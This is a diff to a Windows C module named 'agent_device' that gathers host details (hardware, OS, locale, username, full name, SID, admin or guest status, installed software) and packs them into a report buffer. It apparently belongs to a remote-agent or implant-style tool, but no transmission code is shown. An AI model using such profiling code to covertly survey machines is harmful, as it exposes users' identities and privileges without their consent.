@@ -2,6 +2,7 @@
 #include <Lm.h>
 #include <Sddl.h>
 #include <stdio.h>
+#include <Strsafe.h>
 #include "agent_device.h"
 
 
@@ -12,6 +13,7 @@ VOID GetDeviceInfo()
 	HKEY hKey;
 	ULONG uLen;
 	PDEVICE_INFO pDeviceInfo;
+
 	if (pDeviceContainer != NULL)
 	{
 #ifdef _DEBUG
@@ -23,8 +25,7 @@ VOID GetDeviceInfo()
 #ifdef _DEBUG
 	OutputDebugString(L"[+] Starting GetDeviceInfo\n");
 #endif
-	
-	pDeviceContainer = (PDEVICE_CONTAINER)malloc(sizeof(DEVICE_CONTAINER));
+
 	pDeviceInfo = (PDEVICE_INFO)malloc(sizeof(DEVICE_INFO));
 	memset(pDeviceInfo, 0x0, sizeof(DEVICE_INFO));
 	
@@ -108,6 +109,8 @@ VOID GetDeviceInfo()
 		pDeviceInfo->osinfo.org[0] = L'\0';
 	}
 	
+	// FIN QUI TUTTO OK
+	
 	
 	// user
 	uLen = sizeof(pDeviceInfo->userinfo.username) / sizeof(WCHAR);
@@ -116,29 +119,21 @@ VOID GetDeviceInfo()
 
 	PBYTE pUserInfo = NULL;
 	pDeviceInfo->userinfo.priv = 0;
-
-	if (NetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
-		pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		
-
 	
+	typedef NET_API_STATUS (WINAPI *NetUserGetInfo_p)(
+		_In_   LPCWSTR servername,
+		_In_   LPCWSTR username,
+		_In_   DWORD level,
+		_Out_  LPBYTE *bufptr);
+	NetUserGetInfo_p fpNetUserGetInfo = (NetUserGetInfo_p) GetProcAddress(LoadLibrary(L"Netapi32"), "NetUserGetInfo");
 
-	
+	if (fpNetUserGetInfo)
+		if (fpNetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
+			pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		
+
 	SecureZeroMemory(pDeviceInfo->userinfo.fullname, 0x2);
 	SecureZeroMemory(pDeviceInfo->userinfo.sid, 0x2);
 
-
-	typedef NET_API_STATUS (WINAPI *NETUSERGETINFO)(LPWSTR, LPWSTR, DWORD, LPBYTE*);
-	NETUSERGETINFO pfn_NetUserGetInfo = (NETUSERGETINFO) GetProcAddress(LoadLibrary(L"netapi32"), "NetUserGetInfo");
-
-	if (pfn_NetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 23, &pUserInfo) == NERR_Success)
-	{
-		PWCHAR pSidStr = NULL;
-		wcsncpy_s(pDeviceInfo->userinfo.fullname, sizeof(pDeviceInfo->userinfo.fullname) / sizeof(WCHAR), ((PUSER_INFO_23)pUserInfo)->usri23_full_name, _TRUNCATE);
-		if (ConvertSidToStringSid(((PUSER_INFO_23)pUserInfo)->usri23_user_sid, &pSidStr))
-			wcsncpy_s(pDeviceInfo->userinfo.sid, sizeof(pDeviceInfo->userinfo.sid) / sizeof(WCHAR), pSidStr, _TRUNCATE);
-	}
-	
-	NetApiBufferFree(pUserInfo);
 	
 	
 	// locale & timezone
@@ -158,7 +153,8 @@ VOID GetDeviceInfo()
 
 		RegCloseKey(hKey);
 	}
-	
+
+
 	if (!RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
 	{
 		uLen = sizeof(ULONG);
@@ -168,7 +164,6 @@ VOID GetDeviceInfo()
 		RegCloseKey(hKey);
 	}
 	
-
 	
 	// disk	
 	ULARGE_INTEGER uDiskFree, uDiskTotal;
@@ -189,10 +184,8 @@ VOID GetDeviceInfo()
 	else
 		pDeviceInfo->diskinfo.disktotal = pDeviceInfo->diskinfo.diskfree = 0;
 	
-	
 	BOOL bIsWow64, bIsx64OS;
-	IsWow64Process(GetCurrentProcess(), &bIsWow64);
-	bIsx64OS = IsX64System();
+	IsX64System(&bIsWow64, &bIsx64OS);
 
 	PWCHAR pApplicationList = GetApplicationList(FALSE);
 	PWCHAR pApplicationList64 = NULL;
@@ -201,13 +194,14 @@ VOID GetDeviceInfo()
 		pApplicationList64 = GetApplicationList(TRUE);
 		
 	PWCHAR pDeviceString = (PWCHAR)malloc(sizeof(DEVICE_INFO)
-		+ wcslen(pApplicationList) * sizeof(WCHAR) 
+		+ (pApplicationList ? wcslen(pApplicationList) * sizeof(WCHAR) : 0 )
 		+ (pApplicationList64 ? wcslen(pApplicationList64) * sizeof(WCHAR) : 0)
-		+ 1024);
-	
-	_snwprintf_s(pDeviceString,
-		sizeof(DEVICE_INFO)/sizeof(WCHAR) + wcslen(pApplicationList) + (pApplicationList64 ? wcslen(pApplicationList64) : 0) + 1024/sizeof(WCHAR),
-		_TRUNCATE,
+		+ 1024); // fixme dwSize
+	SecureZeroMemory(pDeviceString, 1024);
+
+	DWORD dwSize =  sizeof(DEVICE_INFO) + (pApplicationList ? wcslen(pApplicationList) * sizeof(WCHAR) : 0 ) + (pApplicationList64 ? wcslen(pApplicationList64) * sizeof(WCHAR) : 0) + 1024;
+
+	StringCbPrintf(pDeviceString, dwSize,
 		L"CPU: %d x %s\n"
 		L"Architecture: %s\n"
 		L"RAM: %dMB free / %dMB total (%u%% used)\n"
@@ -221,7 +215,7 @@ VOID GetDeviceInfo()
 		L"SID: %s\n"
 		L"\nApplication List (x86):\n%s\nApplicationList (x64):\n%s",
 		pDeviceInfo->procinfo.procnum, pDeviceInfo->procinfo.proc,
-		bIsWow64 ? L"64-bit" : L"32-bit",
+		bIsx64OS ? L"64-bit" : L"32-bit",
 		pDeviceInfo->meminfo.memfree, pDeviceInfo->meminfo.memtotal, pDeviceInfo->meminfo.memload,
 		pDeviceInfo->diskinfo.diskfree, pDeviceInfo->diskinfo.disktotal,
 		pDeviceInfo->osinfo.ver, (pDeviceInfo->osinfo.sp[0]) ? L" (" : L"", (pDeviceInfo->osinfo.sp[0]) ? pDeviceInfo->osinfo.sp : L"", (pDeviceInfo->osinfo.sp[0]) ? L")" : L"", bIsx64OS ? L" (64-bit)" : L" (32-bit)",
@@ -229,9 +223,11 @@ VOID GetDeviceInfo()
 		pDeviceInfo->localinfo.lang, pDeviceInfo->localinfo.country, (-1 * (int)pDeviceInfo->localinfo.timebias) / 60, abs((int)pDeviceInfo->localinfo.timebias) % 60,
 		pDeviceInfo->userinfo.username, (pDeviceInfo->userinfo.fullname[0]) ? L" (" : L"", (pDeviceInfo->userinfo.fullname[0]) ? pDeviceInfo->userinfo.fullname : L"", (pDeviceInfo->userinfo.fullname[0]) ? L")" : L"", (pDeviceInfo->userinfo.priv) ? ((pDeviceInfo->userinfo.priv == 1) ? L"" : L" [ADMIN]") : L" [GUEST]",
 		pDeviceInfo->userinfo.sid,
-		pApplicationList,
+		pApplicationList ? pApplicationList: L"",
 		pApplicationList64 ? pApplicationList64 : L"");
-	
+
+
+	pDeviceContainer = (PDEVICE_CONTAINER)malloc(sizeof(DEVICE_CONTAINER));
 	pDeviceContainer->pDataBuffer = (PBYTE)pDeviceString;
 	pDeviceContainer->uSize = (wcslen(pDeviceString)+1)*sizeof(WCHAR);
 	
@@ -299,7 +295,7 @@ PWCHAR GetApplicationList(BOOL bX64View)
 
 			if (!pApplicationList)
 			{
- 				uAppList = wcslen(pProduct)*sizeof(WCHAR) + sizeof(WCHAR);
+ 				uAppList = wcslen(pProduct) * sizeof(WCHAR) + sizeof(WCHAR);
 				pApplicationList = (PWCHAR)realloc(NULL,  uAppList);
 				memset(pApplicationList, 0x0, uAppList);
 			}
@@ -315,13 +311,16 @@ PWCHAR GetApplicationList(BOOL bX64View)
 	return pApplicationList;
 }
 
-BOOL IsX64System()
+VOID IsX64System(PBOOL bIsWow64, PBOOL bIsx64OS)
 {    
     SYSTEM_INFO SysInfo;
+	IsWow64Process((HANDLE)-1, bIsWow64);
 
 	GetNativeSystemInfo(&SysInfo);
 	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
-		return FALSE;
+		*bIsx64OS = FALSE;
+	else
+		*bIsx64OS = TRUE;
 
-	return TRUE;
+	return;
 }
